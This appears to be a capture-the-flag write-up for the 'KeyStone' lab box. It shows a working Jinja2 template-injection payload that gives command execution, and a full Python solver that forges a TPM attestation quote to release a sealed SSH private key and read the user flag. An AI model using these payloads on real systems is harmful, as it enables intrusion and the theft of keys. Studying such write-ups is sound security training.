### Summary

The KeyStone portal passes the `doc` query value to Jinja2 before the document lookup, which gives unauthenticated command execution as `webapp`. The vault source readable through that foothold (`/opt/vault/main.go`) shows that `/verify` never binds the attestation key to a TPM endorsement key, and that the quote parser accepts an empty PCR selection. An attacker-generated RSA key that signs a forged quote therefore gets the sealed `tpm-admin` SSH key, which reads `/home/tpm-admin/user.txt`.

### Steps

1. Scan the volatile target and confirm that SSH and HTTP are exposed.
   ```sh
   nmap -Pn -n --top-ports 1000 10.49.161.199
   ```
   Only 22 (OpenSSH 9.2p1 Debian) and 80 (nginx 1.22.1) are open.

2. Confirm the template injection on `/review`. The `doc` value is rendered as a Jinja2 template, so `{{7*7}}` returns `49`, and a Jinja2 `cycler` global reaches `os.popen`, which gives command execution.
   ```sh
   curl -s -G --data-urlencode "doc={{cycler.__init__.__globals__.os.popen('id').read()}}" \
     http://10.49.161.199/review
   # Requested: uid=1001(webapp) gid=1001(webapp) groups=1001(webapp),994(tpm)
   ```

3. Read the vault implementation through the same foothold. The portal account cannot read `/etc/keystone/README.md`, but `/opt/vault/main.go` is readable, and it documents the vault protocol. The relevant behavior:
   - `/attest` accepts any caller-supplied RSA public key and returns a session, a nonce, zero-valued expected PCRs, and an expected digest.
   - `/verify` checks a PKCS#1 v1.5 SHA-256 signature over a parsed `TPMS_ATTEST`, the nonce in `extraData`, and the expected PCR digest. It never binds the key to the TPM endorsement key.
   - The quote parser accepts an empty PCR selection list, so a valid quote can be built without a TPM.
   - `/secret` releases the sealed payload once for the resulting five-minute token.

4. Forge the attestation and fetch the key. `scripts/vault_forge.py` runs every vault request on the target by sending them through the SSTI, because port 9000 is only bound to `127.0.0.1`. It:
   1. generates an ephemeral 2048-bit RSA key with `openssl`,
   2. calls `POST /attest` with the public key, and gets the nonce and expected digest,
   3. builds the minimal `TPMS_ATTEST` quote with magic `0xFF544347`, type `0x8018`, the nonce, and the digest, then signs it with the ephemeral key,
   4. calls `POST /verify`, gets a token, and calls `GET /secret` to get the sealed payload,
   5. extracts the OpenSSH private key from the payload and uses it to run `cat /home/tpm-admin/user.txt` over SSH.

   ```sh
   ./vault_forge.py
   # isfcr{REDACTED}
   ```
   The authenticated identity is `uid=1003(tpm-admin) gid=1003(tpm-admin) groups=1003(tpm-admin)`.

### Scripts

#### scripts/vault_forge.py

End-to-end solver. It needs `python3`, `openssl` and `ssh` on the attacker machine, and reaches the target at `TARGET_HOST`, which is hardcoded to `10.49.161.199`. Run it with `./vault_forge.py` (or `python3 scripts/vault_forge.py`). It writes its key material to a temporary directory and removes it on exit, then prints the user flag.

```python
#!/usr/bin/env python3

import base64
import html
import json
import re
import shlex
import struct
import subprocess
import tempfile
import urllib.parse
import urllib.request
from pathlib import Path

TARGET_HOST = "10.49.161.199"
BASE_URL = f"http://{TARGET_HOST}"
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
)


def portal_exec(command):
    shell_command = f"{command} 2>&1"
    payload = (
        "{{cycler.__init__.__globals__.os.popen("
        + repr(shell_command)
        + ").read()}}"
    )
    url = f"{BASE_URL}/review?{urllib.parse.urlencode({'doc': payload})}"
    request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    with urllib.request.urlopen(request, timeout=20) as response:
        body = response.read().decode()
    match = re.search(r"Requested: (.*?)</p>", body, re.DOTALL)
    if not match:
        raise RuntimeError("Remote command output was missing from the response")
    return html.unescape(match.group(1)).strip()


def vault_request(method, path, body=None):
    data = body.encode() if body is not None else None
    code = (
        "import base64,urllib.request;"
        f"r=urllib.request.Request('http://127.0.0.1:9000{path}',"
        f"data={data!r},method={method!r},"
        f"headers={{'User-Agent':{USER_AGENT!r},'Content-Type':'application/json'}});"
        "print(base64.b64encode(urllib.request.urlopen(r).read()).decode())"
    )
    output = portal_exec(f"python3 -c {shlex.quote(code)}")
    try:
        return base64.b64decode(output, validate=True)
    except ValueError as error:
        raise RuntimeError(output) from error


def build_quote(nonce, digest):
    quote = struct.pack(">IH", 0xFF544347, 0x8018)
    quote += struct.pack(">H", 0)
    quote += struct.pack(">H", len(nonce)) + nonce
    quote += bytes(17) + bytes(8)
    quote += struct.pack(">I", 0)
    quote += struct.pack(">H", len(digest)) + digest
    return quote


with tempfile.TemporaryDirectory() as directory:
    temp = Path(directory)
    private_key = temp / "ak-private.pem"
    public_key = temp / "ak-public.pem"
    quote_file = temp / "quote.bin"
    signature_file = temp / "quote.sig"

    subprocess.run(
        [
            "openssl",
            "genpkey",
            "-algorithm",
            "RSA",
            "-pkeyopt",
            "rsa_keygen_bits:2048",
            "-out",
            private_key,
        ],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["openssl", "pkey", "-in", private_key, "-pubout", "-out", public_key],
        check=True,
    )

    attest_body = json.dumps({"ak_pub_pem": public_key.read_text()})
    attest = json.loads(vault_request("POST", "/attest", attest_body))
    quote = build_quote(bytes.fromhex(attest["nonce"]), bytes.fromhex(attest["expected_digest"]))
    quote_file.write_bytes(quote)

    subprocess.run(
        [
            "openssl",
            "dgst",
            "-sha256",
            "-sign",
            private_key,
            "-out",
            signature_file,
            quote_file,
        ],
        check=True,
    )

    verify_body = json.dumps(
        {
            "session": attest["session"],
            "quote_msg": base64.b64encode(quote).decode(),
            "quote_sig": base64.b64encode(signature_file.read_bytes()).decode(),
        }
    )
    token = json.loads(vault_request("POST", "/verify", verify_body))["token"]
    secret_path = "/secret?" + urllib.parse.urlencode({"token": token})
    secret = json.loads(vault_request("GET", secret_path))
    key_match = re.search(
        r"-----BEGIN OPENSSH PRIVATE KEY-----.*?-----END OPENSSH PRIVATE KEY-----",
        secret["payload"],
        re.DOTALL,
    )
    if not key_match:
        raise RuntimeError("The sealed payload did not contain an OpenSSH private key")

    ssh_key = temp / "tpm-admin.key"
    known_hosts = temp / "known_hosts"
    ssh_key.write_text(key_match.group(0) + "\n")
    ssh_key.chmod(0o600)
    result = subprocess.run(
        [
            "ssh",
            "-i",
            ssh_key,
            "-o",
            f"UserKnownHostsFile={known_hosts}",
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-o",
            "BatchMode=yes",
            f"tpm-admin@{TARGET_HOST}",
            "cat /home/tpm-admin/user.txt",
        ],
        check=True,
        capture_output=True,
        text=True,
    )
    print(result.stdout.strip())
```

### Notes

- The target address is volatile and is hardcoded as `TARGET_HOST` in `vault_forge.py`. Change it there if the box is redeployed.
- The vault listens on `127.0.0.1:9000` and is not reachable from outside, which is why every vault call is relayed through the SSTI as `webapp`.
- The vault source is only available through the foothold. `/etc/keystone/README.md` is denied to `webapp`. The operator note there says the vault trusts any client-supplied attestation key after signature verification, which matches the code.
- The earlier helper scripts `f01_ssti_rce.py` (the `id` check) and `ssti_read.py` (reads a remote file through the same SSTI) are reproduction aids. The curl request in step 2 and the step 3 read cover them, so they are not embedded.
- The record of the validated run is in `artifacts/user-flag-proof.txt`, which lists the identity, the flag path `/home/tpm-admin/user.txt`, and the reproduction command.
- The KeyStone root stage that uses the `tpm-admin` access is in the `keystone-root` write-up.
